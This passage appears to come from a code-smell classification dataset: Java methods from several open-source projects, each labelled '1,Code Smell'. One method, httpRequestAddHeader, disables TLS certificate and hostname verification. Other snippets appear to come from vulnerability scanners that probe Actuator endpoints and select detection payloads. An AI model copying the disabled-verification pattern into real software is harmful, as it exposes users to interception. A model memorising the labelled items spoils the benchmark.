      JSONArray objects=JSON.parseArray(s);
      for (      Object o : objects) {
        res=(Map)o;
        return res.containsKey(""bean"") || res.containsKey(""scope"") || res.containsKey(""dependencies"");
      }
    }
 catch (    Exception e) {
      return false;
    }
  }
 else   if (url.contains(""configprops"")) {
    try {
      Map res=(Map)JSON.parse(s);
      return res.containsKey(""configurationPropertiesReportEndpoint"");
    }
 catch (    Exception e) {
      return false;
    }
  }
 else   if (url.contains(""mappings"")) {
    return s.contains(""bean"") || s.contains(""method"");
  }
 else   if (url.contains(""metrics"")) {
    return s.contains(""threads"") || s.contains(""heap"");
  }
  return false;
}",1,Code Smell
"@Test void testDeterministicAndNonDeterministicProvidersReturnValues(){
  final int numberOfTestsPerMethod=100;
  final Reflections reflections=new Reflections(""net.datafaker.providers"");
  final Set<Class<?>> classes=reflections.get(SubTypes.of(AbstractProvider.class).asClass());
  for (  var clazz : classes) {
    final Collection<Method> methods=Arrays.stream(clazz.getDeclaredMethods()).filter(m -> Modifier.isPublic(m.getModifiers()) && m.getParameterCount() == 0).collect(Collectors.toSet());
    if (methods.isEmpty())     continue;
    Constructor<AbstractProvider<?>> constructor=null;
    final AbstractProvider<?> ap;
    try {
      final Set<Constructor<AbstractProvider<?>>> constructorsWith1Arg=Arrays.stream(clazz.getDeclaredConstructors()).filter(c -> c.getParameterCount() == 1).map(c -> (Constructor<AbstractProvider<?>>)c).collect(Collectors.toSet());
      for (      var c : constructorsWith1Arg) {
        final Class<?>[] types=c.getParameterTypes();
        if (types[0].isAssignableFrom(Faker.class)) {
          constructor=c;
          break;
        }
      }
      assertThat(constructor).isNotNull();
      constructor.setAccessible(true);
      ap=constructor.newInstance(faker);
    }
 catch (    InvocationTargetException|InstantiationException|IllegalAccessException e) {
      throw new RuntimeException(e);
    }
    for (    Method m : methods) {
      final var set=new HashSet<>();
      try {
        int currentSize=0;
        for (int i=0; i < numberOfTestsPerMethod && currentSize <= 1; i++) {
          set.add(m.invoke(ap));
          currentSize=set.size();
        }
      }
 catch (      IllegalAccessException|InvocationTargetException e) {
        throw new RuntimeException(e);
      }
      if (m.isAnnotationPresent(Deterministic.class)) {
        assertThat(set).as(""Class: "" + ap.getClass().getName() + "", method: ""+ m.getName()+ "" should have the same return value"").hasSize(1);
      }
 else {
        assertThat(set).as(""Class: "" + ap.getClass().getName() + "", method: ""+ m.getName()+ "" should generate different return values"").hasSizeGreaterThan(1);
      }
    }
  }
}",1,Code Smell
"public void checkEmojiPacks(){
  loadEmojisInfo((error) -> {
    if (getSelectedEmojiPackId().equals(""default""))     return;
    if (emojiPacksInfo.isEmpty()) {
      if (!isInstalledOffline(emojiPack)) {
        emojiPack=""default"";
      }
      reloadEmoji();
      return;
    }
    for (    EmojiPackBase emojiPackBase : emojiPacksInfo) {
      if (emojiPackBase instanceof EmojiPackInfo) {
        EmojiPackInfo emojiPackInfo=(EmojiPackInfo)emojiPackBase;
        boolean update=isInstalledOldVersion(emojiPackInfo.packId,emojiPackInfo.packVersion);
        if (emojiPack.equals(emojiPackInfo.packId)) {
          if (!isPackInstalled(emojiPackInfo)) {
            downloadPack(emojiPackInfo,update,false);
          }
 else {
            reloadEmoji();
          }
          break;
        }
      }
    }
  }
);
}
",1,Code Smell
"@java.lang.Override public void deleteBalance(String id){
  String path=getPath(id);
  String config=dynamicConfiguration.getConfig(path);
  OverrideConfig oldConfig=null;
  if (config != null) {
    OverrideDTO overrideDTO=YamlParser.loadObject(config,OverrideDTO.class);
    List<OverrideConfig> configs=overrideDTO.getConfigs();
    if (configs != null) {
      for (      OverrideConfig overrideConfig : configs) {
        if (Constants.BALANCING.equals(overrideConfig.getType())) {
          if (overrideDTO.getScope().equals(Constants.SERVICE)) {
            oldConfig=overrideConfig;
          }
          configs.remove(overrideConfig);
          break;
        }
      }
      if (configs.size() == 0) {
        dynamicConfiguration.deleteConfig(path);
      }
 else {
        dynamicConfiguration.setConfig(path,YamlParser.dumpObject(overrideDTO));
      }
    }
    if (oldConfig != null) {
      String key=overrideDTO.getKey();
      BalancingDTO balancingDTO=OverrideUtils.configtoBalancingDTO(oldConfig,Constants.SERVICE,key);
      unregisterBalancing(balancingDTO);
    }
  }
}",1,Code Smell
"private Payload generatePayload(PayloadGeneratorConfig config,boolean enforceNoCallback){
  PayloadDefinition selectedPayload=null;
  if (tcsClient.isCallbackServerEnabled() && !enforceNoCallback) {
    for (    PayloadDefinition candidate : payloads) {
      if (isMatchingPayload(candidate,config) && candidate.getUsesCallbackServer().getValue()) {
        selectedPayload=candidate;
        break;
      }
    }
  }
  if (selectedPayload == null) {
    for (    PayloadDefinition candidate : payloads) {
      if (isMatchingPayload(candidate,config) && !candidate.getUsesCallbackServer().getValue()) {
        selectedPayload=candidate;
        break;
      }
    }
  }
  if (selectedPayload == null) {
    throw new NotImplementedException(""No payload implemented for %s vulnerability type, %s interpretation environment, %s"" + "" execution environment"",config.getVulnerabilityType(),config.getInterpretationEnvironment(),config.getExecutionEnvironment());
  }
  return convertParsedPayload(selectedPayload,config);
}
",1,Code Smell
"private void setFeeRatePriority(Double feeRateAmt){
  Map<Integer,Double> targetBlocksFeeRates=getTargetBlocksFeeRates();
  Integer targetBlocks=getTargetBlocks(feeRateAmt);
  if (targetBlocksFeeRates.get(Integer.MAX_VALUE) != null) {
    Double minFeeRate=targetBlocksFeeRates.get(Integer.MAX_VALUE);
    if (minFeeRate > 1.0 && feeRateAmt < minFeeRate) {
      feeRatePriority.setText(""Below Minimum"");
      feeRatePriority.setTooltip(new Tooltip(""Transactions at this fee rate are currently being purged from the default sized mempool""));
      feeRatePriorityGlyph.setStyle(""-fx-text-fill: #a0a1a7cc"");
      feeRatePriorityGlyph.setIcon(FontAwesome5.Glyph.EXCLAMATION_CIRCLE);
      return;
    }
    Double lowestBlocksRate=targetBlocksFeeRates.get(TARGET_BLOCKS_RANGE.get(TARGET_BLOCKS_RANGE.size() - 1));
    if (lowestBlocksRate >= minFeeRate && feeRateAmt < (minFeeRate + ((lowestBlocksRate - minFeeRate) / 2)) && !isPayjoinTx()) {
      feeRatePriority.setText(""Try Then Replace"");
      feeRatePriority.setTooltip(new Tooltip(""Send a transaction, verify it appears in the destination wallet, then RBF to get it confirmed or sent to another address""));
      feeRatePriorityGlyph.setStyle(""-fx-text-fill: #7eb7c9cc"");
      feeRatePriorityGlyph.setIcon(FontAwesome5.Glyph.PLUS_CIRCLE);
      return;
    }
  }
  if (targetBlocks != null) {
    if (targetBlocks < FeeRatesSource.BLOCKS_IN_HALF_HOUR) {
      Double maxFeeRate=FEE_RATES_RANGE.get(FEE_RATES_RANGE.size() - 1).doubleValue();
      Double highestBlocksRate=targetBlocksFeeRates.get(TARGET_BLOCKS_RANGE.get(0));
      if (highestBlocksRate < maxFeeRate && feeRateAmt > (highestBlocksRate + ((maxFeeRate - highestBlocksRate) / 10))) {
        feeRatePriority.setText(""Overpaid"");
        feeRatePriority.setTooltip(new Tooltip(""Transaction fees at this rate are likely higher than necessary""));
        feeRatePriorityGlyph.setStyle(""-fx-text-fill: #c8416499"");
        feeRatePriorityGlyph.setIcon(FontAwesome5.Glyph.EXCLAMATION_CIRCLE);
      }
 else {
        feeRatePriority.setText(""High Priority"");
        feeRatePriority.setTooltip(new Tooltip(""Typically confirms within minutes""));
        feeRatePriorityGlyph.setStyle(""-fx-text-fill: #c8416499"");
        feeRatePriorityGlyph.setIcon(FontAwesome5.Glyph.CIRCLE);
      }
    }
 else     if (targetBlocks < FeeRatesSource.BLOCKS_IN_HOUR) {
      feeRatePriority.setText(""Medium Priority"");
      feeRatePriority.setTooltip(new Tooltip(""Typically confirms within an hour or two""));
      feeRatePriorityGlyph.setStyle(""-fx-text-fill: #fba71b99"");
      feeRatePriorityGlyph.setIcon(FontAwesome5.Glyph.CIRCLE);
    }
 else {
      feeRatePriority.setText(""Low Priority"");
      feeRatePriority.setTooltip(new Tooltip(""Typically confirms in a day or longer""));
      feeRatePriorityGlyph.setStyle(""-fx-text-fill: #41a9c999"");
      feeRatePriorityGlyph.setIcon(FontAwesome5.Glyph.CIRCLE);
    }
  }
}",1,Code Smell
"private void showNotification(String name,Bitmap photo){
  Intent intent=new Intent(this,LaunchActivity.class).setAction(groupCall != null ? ""voip_chat"" : ""voip"");
  if (groupCall != null) {
    intent.putExtra(""currentAccount"",currentAccount);
  }
  Notification.Builder builder=new Notification.Builder(this).setContentText(name).setContentIntent(PendingIntent.getActivity(this,50,intent,PendingIntent.FLAG_MUTABLE));
  if (groupCall != null) {
    builder.setContentTitle(ChatObject.isChannelOrGiga(chat) ? LocaleController.getString(""VoipLiveStream"",R.string.VoipLiveStream) : LocaleController.getString(""VoipVoiceChat"",R.string.VoipVoiceChat));
    builder.setSmallIcon(isMicMute() ? R.drawable.voicechat_muted : R.drawable.voicechat_active);
  }
 else {
    builder.setContentTitle(LocaleController.getString(""VoipOutgoingCall"",R.string.VoipOutgoingCall));
    builder.setSmallIcon(R.drawable.notification);
  }
  Intent endIntent=new Intent(this,VoIPActionsReceiver.class);
  endIntent.setAction(getPackageName() + "".END_CALL"");
  if (groupCall != null) {
    builder.addAction(R.drawable.ic_call_end_white_24dp,ChatObject.isChannelOrGiga(chat) ? LocaleController.getString(""VoipChannelLeaveAlertTitle"",R.string.VoipChannelLeaveAlertTitle) : LocaleController.getString(""VoipGroupLeaveAlertTitle"",R.string.VoipGroupLeaveAlertTitle),PendingIntent.getBroadcast(this,0,endIntent,PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_UPDATE_CURRENT));
  }
 else {
    builder.addAction(R.drawable.ic_call_end_white_24dp,LocaleController.getString(""VoipEndCall"",R.string.VoipEndCall),PendingIntent.getBroadcast(this,0,endIntent,PendingIntent.FLAG_MUTABLE | PendingIntent.FLAG_UPDATE_CURRENT));
  }
  builder.setPriority(Notification.PRIORITY_MAX);
  builder.setShowWhen(false);
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
    builder.setColor(0xff282e31);
    builder.setColorized(true);
  }
 else   if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
    builder.setColor(0xff2ca5e0);
  }
  if (Build.VERSION.SDK_INT >= 26) {
    NotificationsController.checkOtherNotificationsChannel();
    builder.setChannelId(NotificationsController.OTHER_NOTIFICATIONS_CHANNEL);
  }
  if (photo != null) {
    builder.setLargeIcon(photo);
  }
  try {
    startForeground(ID_ONGOING_CALL_NOTIFICATION,builder.getNotification());
  }
 catch (  Exception e) {
    if (photo != null && e instanceof IllegalArgumentException) {
      showNotification(name,null);
    }
  }
}
private void showNotification(){
  if (user != null) {
    showNotification(ContactsController.formatName(user.first_name,user.last_name),getRoundAvatarBitmap(user));
  }
 else {
    showNotification(chat.title,getRoundAvatarBitmap(chat));
  }
}",1,Code Smell
"private void dumpAnnotatedInstance(Class<?> type,Object instance,JsonWriter writer,Set<Object> alreadyDumped) throws IOException {
  DebugDump typedd=type.getAnnotation(DebugDump.class);
  boolean exclude=typedd != null && typedd.exclude();
  boolean allFields=!exclude && (typedd != null || type.getPackageName().startsWith(""de.bluecolored.bluemap""));
  for (  Field field : type.getDeclaredFields()) {
    String key=field.getName();
    Object value;
    try {
      DebugDump dd=field.getAnnotation(DebugDump.class);
      if (dd == null) {
        if (!allFields)         continue;
        if (Modifier.isStatic(field.getModifiers()))         continue;
        if (Modifier.isTransient(field.getModifiers()))         continue;
      }
 else {
        if (dd.exclude())         continue;
      }
      if (dd != null) {
        key=dd.value();
        if (key.isEmpty())         key=field.getName();
      }
      field.setAccessible(true);
      value=field.get(instance);
    }
 catch (    Exception ex) {
      writer.name(""!!"" + key).value(ex.toString());
      continue;
    }
    writer.name(key);
    dumpInstance(value,writer,alreadyDumped);
  }
  for (  Method method : type.getDeclaredMethods()) {
    String key=method.toGenericString();
    Object value;
    try {
      DebugDump dd=method.getAnnotation(DebugDump.class);
      if (dd == null || dd.exclude())       continue;
      key=dd.value();
      if (key.isEmpty())       key=method.toGenericString();
      method.setAccessible(true);
      value=method.invoke(instance);
    }
 catch (    Exception ex) {
      writer.name(""!!"" + key).value(ex.toString());
      continue;
    }
    writer.name(key);
    dumpInstance(value,writer,alreadyDumped);
  }
  for (  Class<?> iface : type.getInterfaces()) {
    dumpAnnotatedInstance(iface,instance,writer,alreadyDumped);
  }
  Class<?> typeSuperclass=type.getSuperclass();
  if (typeSuperclass != null) {
    dumpAnnotatedInstance(typeSuperclass,instance,writer,alreadyDumped);
  }
}
",1,Code Smell
"public static String httpRequestAddHeader(String requestUrl,int timeOut,String requestMethod,String contentType,String postString,String encoding,HashMap<String,String> headers) throws Exception {
  if ("""".equals(encoding) || encoding == null) {
    encoding=DefalutEncoding;
  }
  URLConnection httpUrlConn=null;
  HttpsURLConnection hsc=null;
  HttpURLConnection hc=null;
  InputStream inputStream=null;
  BufferedInputStream bis=null;
  Object var12=null;
  String result;
  try {
    URL url=new URL(requestUrl);
    if (requestUrl.startsWith(""https"")) {
      SSLContext sslContext=SSLContext.getInstance(""SSL"");
      TrustManager[] tm=new TrustManager[]{new X509TrustUtiil()};
      sslContext.init((KeyManager[])null,tm,new SecureRandom());
      SSLSocketFactory ssf=sslContext.getSocketFactory();
      Proxy proxy=(Proxy)currentProxy.get(""proxy"");
      if (proxy != null) {
        hsc=(HttpsURLConnection)url.openConnection(proxy);
      }
 else {
        hsc=(HttpsURLConnection)url.openConnection();
      }
      hsc.setSSLSocketFactory(ssf);
      hsc.setHostnameVerifier(allHostsValid);
      httpUrlConn=hsc;
    }
 else {
      Proxy proxy=(Proxy)currentProxy.get(""proxy"");
      if (proxy != null) {
        hc=(HttpURLConnection)url.openConnection(proxy);
      }
 else {
        hc=(HttpURLConnection)url.openConnection();
      }
      hc.setRequestMethod(requestMethod);
      hc.setInstanceFollowRedirects(false);
      httpUrlConn=hc;
    }
    ((URLConnection)httpUrlConn).setConnectTimeout(timeOut);
    ((URLConnection)httpUrlConn).setReadTimeout(timeOut);
    if (contentType != null && !"""".equals(contentType)) {
      ((URLConnection)httpUrlConn).setRequestProperty(""Content-Type"",contentType);
    }
    String key;
    if (headers != null) {
      Iterator var28=headers.keySet().iterator();
      while (var28.hasNext()) {
        key=(String)var28.next();
        String val=(String)headers.get(key);
        ((URLConnection)httpUrlConn).addRequestProperty(key,val);
      }
    }
    ((URLConnection)httpUrlConn).setDoOutput(true);
    ((URLConnection)httpUrlConn).setDoInput(true);
    ((URLConnection)httpUrlConn).connect();
    if (null != postString && !"""".equals(postString)) {
      OutputStream outputStream=((URLConnection)httpUrlConn).getOutputStream();
      outputStream.write(postString.getBytes(encoding));
      outputStream.close();
    }
    inputStream=((URLConnection)httpUrlConn).getInputStream();
    result=readString(inputStream,encoding);
    key=result;
    return key;
  }
 catch (  IOException var22) {
    System.out.println(var22);
    if (hsc != null) {
      result=readString(hsc.getErrorStream(),encoding);
      return result;
    }
    if (hc != null) {
      result=readString(hc.getErrorStream(),encoding);
      return result;
    }
    result="""";
  }
catch (  Exception var23) {
    throw var23;
  }
 finally {
    if (hsc != null) {
      hsc.disconnect();
    }
    if (hc != null) {
      hc.disconnect();
    }
  }
  return result;
}",1,Code Smell
"@Override public void onBindViewHolder(RecyclerView.ViewHolder holder,int position){
  if (holder.getItemViewType() == VIEW_TYPE_LOCATION) {
    TLRPC.TL_messageMediaVenue place=null;
    String iconUrl=null;
    int oposition=position;
    int p=position;
    if (!locations.isEmpty()) {
      position--;
    }
    if (position >= 0 && position < locations.size()) {
      place=locations.get(position);
      iconUrl=""pin"";
      p=2;
    }
 else     if (!isSearching()) {
      position-=locations.size();
      if (!searchingLocations && !locations.isEmpty()) {
        position-=1;
      }
      if (position >= 0 && position < places.size()) {
        place=places.get(position);
        p=position;
      }
    }
    LocationCell locationCell=(LocationCell)holder.itemView;
    locationCell.setLocation(place,p,oposition != getItemCount() - 1 && (searchingLocations || locations.isEmpty() || oposition != (locations.size())));
  }
 else   if (holder.getItemViewType() == VIEW_TYPE_SECTION) {
    if (position == 0 && !locations.isEmpty()) {
      ((GraySectionCell)holder.itemView).setText(LocaleController.getString(""LocationOnMap"",R.string.LocationOnMap));
    }
 else {
      ((GraySectionCell)holder.itemView).setText(LocaleController.getString(""NearbyVenue"",R.string.NearbyVenue));
    }
  }
}",1,Code Smell
"public void checkGenericAnimations(){
  if (getUserConfig().genericAnimationsStickerPack != null) {
    String packName=getUserConfig().genericAnimationsStickerPack;
    TLRPC.TL_messages_stickerSet set=getStickerSetByName(packName);
    if (set == null) {
      set=getStickerSetByEmojiOrName(packName);
    }
    if (set == null) {
      MediaDataController.getInstance(currentAccount).loadStickersByEmojiOrName(packName,false,true);
    }
  }
  if (loadingGenericAnimations || System.currentTimeMillis() - getUserConfig().lastUpdatedGenericAnimations < 86400000) {
    return;
  }
  loadingGenericAnimations=true;
  TLRPC.TL_messages_getStickerSet req=new TLRPC.TL_messages_getStickerSet();
  req.stickerset=new TLRPC.TL_inputStickerSetEmojiGenericAnimations();
  getConnectionsManager().sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
    if (response instanceof TLRPC.TL_messages_stickerSet) {
      TLRPC.TL_messages_stickerSet stickerSet=(TLRPC.TL_messages_stickerSet)response;
      getUserConfig().genericAnimationsStickerPack=stickerSet.set.short_name;
      getUserConfig().lastUpdatedGenericAnimations=System.currentTimeMillis();
      getUserConfig().saveConfig(false);
      processLoadedDiceStickers(getUserConfig().genericAnimationsStickerPack,false,stickerSet,false,(int)(System.currentTimeMillis() / 1000));
      for (int i=0; i < stickerSet.documents.size(); i++) {
        if (currentAccount == UserConfig.selectedAccount) {
          preloadImage(ImageLocation.getForDocument(stickerSet.documents.get(i)),FileLoader.PRIORITY_LOW);
        }
      }
    }
  }
));
}",1,Code Smell
"public static LocalTime toLocalTime(Object obj){
  if (obj == null) {
    return null;
  }
  if (obj instanceof LocalTime) {
    return (LocalTime)obj;
  }
  if (obj instanceof LocalDateTime) {
    return ((LocalDateTime)obj).toLocalTime();
  }
  if (obj instanceof java.sql.Date) {
    throw new IllegalArgumentException(""Unable to convert to LocalDate from a java.sql.Date value '"" + obj + ""'"");
  }
  if (obj instanceof java.sql.Time) {
    java.sql.Time time=(java.sql.Time)obj;
    long millis=(int)(time.getTime() % MILLISECONDS_PER_SECOND);
    int nanosOfSecond=(int)(millis * NANOSECONDS_PER_MILLISECOND);
    return LocalTime.of(time.getHours(),time.getMinutes(),time.getSeconds(),nanosOfSecond);
  }
  if (obj instanceof java.sql.Timestamp) {
    java.sql.Timestamp timestamp=(java.sql.Timestamp)obj;
    return LocalTime.of(timestamp.getHours(),timestamp.getMinutes(),timestamp.getSeconds(),timestamp.getNanos());
  }
  if (obj instanceof java.util.Date) {
    java.util.Date date=(java.util.Date)obj;
    long millis=(int)(date.getTime() % MILLISECONDS_PER_SECOND);
    int nanosOfSecond=(int)(millis * NANOSECONDS_PER_MILLISECOND);
    return LocalTime.of(date.getHours(),date.getMinutes(),date.getSeconds(),nanosOfSecond);
  }
  if (obj instanceof Duration) {
    Long value=((Duration)obj).toNanos();
    if (value >= 0 && value <= NANOSECONDS_PER_DAY) {
      return LocalTime.ofNanoOfDay(value);
    }
 else {
      throw new IllegalArgumentException(""Time values must use number of milliseconds greater than 0 and less than 86400000000000"");
    }
  }
  throw new IllegalArgumentException(""Unable to convert to LocalTime from unexpected value '"" + obj + ""' of type ""+ obj.getClass().getName());
}",1,Code Smell
"@SuppressLint(""WrongConstant"") public static void lockOrientation(Activity activity){
  if (activity == null || prevOrientation != -10) {
    return;
  }
  try {
    prevOrientation=activity.getRequestedOrientation();
    WindowManager manager=(WindowManager)activity.getSystemService(Activity.WINDOW_SERVICE);
    if (manager != null && manager.getDefaultDisplay() != null) {
      int rotation=manager.getDefaultDisplay().getRotation();
      int orientation=activity.getResources().getConfiguration().orientation;
      if (rotation == Surface.ROTATION_270) {
        if (orientation == Configuration.ORIENTATION_PORTRAIT) {
          activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
        }
 else {
          activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_REVERSE_LANDSCAPE);
        }
      }
 else       if (rotation == Surface.ROTATION_90) {
        if (orientation == Configuration.ORIENTATION_PORTRAIT) {
          activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_REVERSE_PORTRAIT);
        }
 else {
          activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
        }
      }
 else       if (rotation == Surface.ROTATION_0) {
        if (orientation == Configuration.ORIENTATION_LANDSCAPE) {
          activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
        }
 else {
          activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
        }
      }
 else {
        if (orientation == Configuration.ORIENTATION_LANDSCAPE) {
          activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_REVERSE_LANDSCAPE);
        }
 else {
          activity.setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_REVERSE_PORTRAIT);
        }
      }
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
}",1,Code Smell
"@Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.emojiLoaded) {
    if (gridView != null) {
      int count=gridView.getChildCount();
      for (int a=0; a < count; a++) {
        gridView.getChildAt(a).invalidate();
      }
    }
  }
 else   if (id == NotificationCenter.fileUploaded) {
    if (uploadImportStickers == null) {
      return;
    }
    String location=(String)args[0];
    SendMessagesHelper.ImportingSticker sticker=uploadImportStickers.get(location);
    if (sticker != null) {
      sticker.uploadMedia(currentAccount,(TLRPC.InputFile)args[1],() -> {
        if (isDismissed()) {
          return;
        }
        uploadImportStickers.remove(location);
        if (!""application/x-tgsticker"".equals(sticker.mimeType)) {
          removeSticker(sticker);
        }
 else {
          sticker.validated=true;
          int idx=importingStickersPaths.indexOf(sticker);
          if (idx >= 0) {
            RecyclerView.ViewHolder holder=gridView.findViewHolderForAdapterPosition(idx);
            if (holder != null) {
              ((StickerEmojiCell)holder.itemView).setSticker(sticker);
            }
          }
 else {
            adapter.notifyDataSetChanged();
          }
        }
        if (uploadImportStickers.isEmpty()) {
          updateFields();
        }
      }
);
    }
  }
 else   if (id == NotificationCenter.fileUploadFailed) {
    if (uploadImportStickers == null) {
      return;
    }
    String location=(String)args[0];
    SendMessagesHelper.ImportingSticker sticker=uploadImportStickers.remove(location);
    if (sticker != null) {
      removeSticker(sticker);
    }
    if (uploadImportStickers.isEmpty()) {
      updateFields();
    }
  }
}",1,Code Smell
"public void onShow(Runnable dismiss){
  if (listStateId != null) {
    Parcelable state=listStates.get(listStateId);
    if (state != null) {
    }
  }
  this.dismiss=dismiss;
  if (!drawBackground) {
    checkScroll();
    for (int i=0; i < emojiGridView.getChildCount(); ++i) {
      View child=emojiGridView.getChildAt(i);
      child.setScaleX(1);
      child.setScaleY(1);
    }
    return;
  }
  if (showAnimator != null) {
    showAnimator.cancel();
    showAnimator=null;
  }
  if (hideAnimator != null) {
    hideAnimator.cancel();
    hideAnimator=null;
  }
  boolean animated=type != TYPE_TOPIC_ICON && type != TYPE_AVATAR_CONSTRUCTOR;
  if (animated) {
    showAnimator=ValueAnimator.ofFloat(0,1);
    showAnimator.addUpdateListener(anm -> {
      final float t=(float)anm.getAnimatedValue();
      updateShow(t);
    }
);
    showAnimator.addListener(new AnimatorListenerAdapter(){
      @Override public void onAnimationEnd(      Animator animation){
        NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.startAllHeavyOperations,512);
        NotificationCenter.getGlobalInstance().onAnimationFinish(animationIndex);
        AndroidUtilities.runOnUIThread(NotificationCenter.getGlobalInstance()::runDelayedNotifications);
        checkScroll();
        updateShow(1);
        for (int i=0; i < emojiGridView.getChildCount(); ++i) {
          View child=emojiGridView.getChildAt(i);
          child.setScaleX(1);
          child.setScaleY(1);
        }
        for (int i=0; i < emojiTabs.contentView.getChildCount(); ++i) {
          View child=emojiTabs.contentView.getChildAt(i);
          child.setScaleX(1);
          child.setScaleY(1);
        }
        emojiTabs.contentView.invalidate();
      }
    }
);
    updateShow(0);
    showAnimator.setDuration(showDuration);
    NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.stopAllHeavyOperations,512);
    animationIndex=NotificationCenter.getGlobalInstance().setAnimationInProgress(animationIndex,null);
    showAnimator.start();
  }
 else {
    checkScroll();
    updateShow(1);
  }
}",1,Code Smell
"/** 
 * Assert that the log file contains specified events(log message).
 * @param events log message, a single log file line
 * @throws IOException
 */
public static synchronized void assertContains(String... events) throws IOException {
  Set<String> expectedEvents=new HashSet<>(events.length);
  for (  String event : events) {
    expectedEvents.add(event);
  }
  Set<String> foundEvents=new HashSet<>(events.length);
  if (reader == null) {
    reader=new RandomAccessFile(logFile,""r"");
  }
  while (true) {
    String line=reader.readLine();
    if (line == null) {
      break;
    }
    line=new String(line.getBytes(""ISO-8859-1""),""utf-8"");
    for (    String event : events) {
      if (line.contains(event)) {
        foundEvents.add(event);
      }
    }
  }
  expectedEvents.removeAll(foundEvents);
  if (!expectedEvents.isEmpty()) {
    Assert.fail(String.format(""%d events not found: %s"",expectedEvents.size(),expectedEvents.toString()));
  }
}",1,Code Smell
"/** 
 * 更新记录项
 * @param newItems
 * @param removeItems
 * @return
 */
public synchronized List<DisplayItemInfo> updateRecordingItems(List<DisplayItemInfo> newItems,List<DisplayItemInfo> removeItems){
  List<DisplayItemInfo> newInfos=new ArrayList<>(currentDisplayInfo);
  if (removeItems != null && removeItems.size() > 0) {
    for (    DisplayItemInfo remove : removeItems) {
      provider.stopDisplay(remove.getName());
    }
    newInfos.removeAll(removeItems);
  }
  List<DisplayItemInfo> failed=new ArrayList<>();
  if (newItems != null && newItems.size() > 0) {
    for (    DisplayItemInfo info : newItems) {
      boolean result=provider.startDisplay(info.getKey());
      if (result) {
        newInfos.add(info);
      }
 else {
        failed.add(info);
      }
    }
  }
  currentDisplayInfo=newInfos;
  if (connection == null && currentDisplayInfo.size() > 0) {
    start();
  }
 else   if (connection != null && currentDisplayInfo.size() == 0) {
    stop();
  }
  return failed;
}",1,Code Smell
"/** 
 * AUTHENTIKEY           
 */
public APDUResponse cardTransmit(APDUCommand plainApdu){
  boolean isApduTransmitted=false;
  do {
    try {
      byte[] apduBytes=plainApdu.serialize();
      byte ins=apduBytes[1];
      boolean isEncrypted=false;
      if (status == null) {
        APDUCommand statusCapdu=new APDUCommand(0xB0,INS_GET_STATUS,0x00,0x00,new byte[0]);
        APDUResponse statusRapdu=this.cardTransport.send(statusCapdu);
        status=new SatoCardStatus(statusRapdu);
      }
      APDUCommand capdu=plainApdu;
      if (status.needsSecureChannel() && (ins != 0xA4) && (ins != 0x81)&& (ins != 0x82)&& (ins != INS_GET_STATUS)) {
        if (!secureChannel.initializedSecureChannel()) {
          APDUResponse secChannelRapdu=this.cardInitiateSecureChannel();
          byte[] pubkey=this.parser.parseInitiateSecureChannel(secChannelRapdu);
          this.secureChannel.initiateSecureChannel(pubkey);
        }
        capdu=secureChannel.encryptSecureChannel(plainApdu);
        isEncrypted=true;
      }
      APDUResponse rapdu=this.cardTransport.send(capdu);
      int sw12=rapdu.getSw();
      if (sw12 == 0x9000) {
        if (isEncrypted) {
          rapdu=secureChannel.decryptSecureChannel(rapdu);
        }
        isApduTransmitted=true;
        return rapdu;
      }
 else       if (sw12 == 0x9C06) {
        log.error(""Error, Satochip PIN required"");
        throw new CardAuthorizationException(""PIN is required"");
      }
 else       if (sw12 == 0x9C21) {
        log.error(""Error, Satochip secure channel required"");
        secureChannel.resetSecureChannel();
      }
 else {
        isApduTransmitted=true;
        return rapdu;
      }
    }
 catch (    Exception e) {
      log.warn(""Error transmitting Satochip command set"" + e);
      return new APDUResponse(new byte[0],(byte)0x00,(byte)0x00);
    }
  }
 while (!isApduTransmitted);
  return new APDUResponse(new byte[0],(byte)0x00,(byte)0x00);
}",1,Code Smell
"/** 
 * Gets media type.
 * @param schema             the schema
 * @param components         the components
 * @param jsonViewAnnotation the json view annotation
 * @param annotationContent  the annotation content
 * @param openapi31          the openapi 31
 * @return the media type
 */
private static MediaType getMediaType(Schema schema,Components components,JsonView jsonViewAnnotation,io.swagger.v3.oas.annotations.media.Content annotationContent,boolean openapi31){
  MediaType mediaType=new MediaType();
  if (annotationContent.schema().hidden()) {
    return mediaType;
  }
  if (components == null) {
    mediaType.setSchema(schema);
    return mediaType;
  }
  try {
    getSchema(annotationContent,components,jsonViewAnnotation,openapi31).ifPresent(mediaType::setSchema);
    if (annotationContent.schemaProperties().length > 0) {
      if (mediaType.getSchema() == null) {
        mediaType.schema(new ObjectSchema());
      }
      Schema oSchema=mediaType.getSchema();
      for (      SchemaProperty sp : annotationContent.schemaProperties()) {
        Class<?> schemaImplementation=sp.schema().implementation();
        boolean isArray=false;
        if (schemaImplementation == Void.class) {
          schemaImplementation=sp.array().schema().implementation();
          if (schemaImplementation != Void.class) {
            isArray=true;
          }
        }
        getSchema(sp.schema(),sp.array(),isArray,schemaImplementation,components,jsonViewAnnotation,openapi31).ifPresent(s -> {
          if (""array"".equals(oSchema.getType())) {
            oSchema.getItems().addProperty(sp.name(),s);
          }
 else {
            oSchema.addProperty(sp.name(),s);
          }
        }
);
      }
    }
    if (hasSchemaAnnotation(annotationContent.additionalPropertiesSchema()) && mediaType.getSchema() != null && !Boolean.TRUE.equals(mediaType.getSchema().getAdditionalProperties()) && !Boolean.FALSE.equals(mediaType.getSchema().getAdditionalProperties())) {
      getSchemaFromAnnotation(annotationContent.additionalPropertiesSchema(),components,jsonViewAnnotation,openapi31).ifPresent(s -> {
        if (""array"".equals(mediaType.getSchema().getType())) {
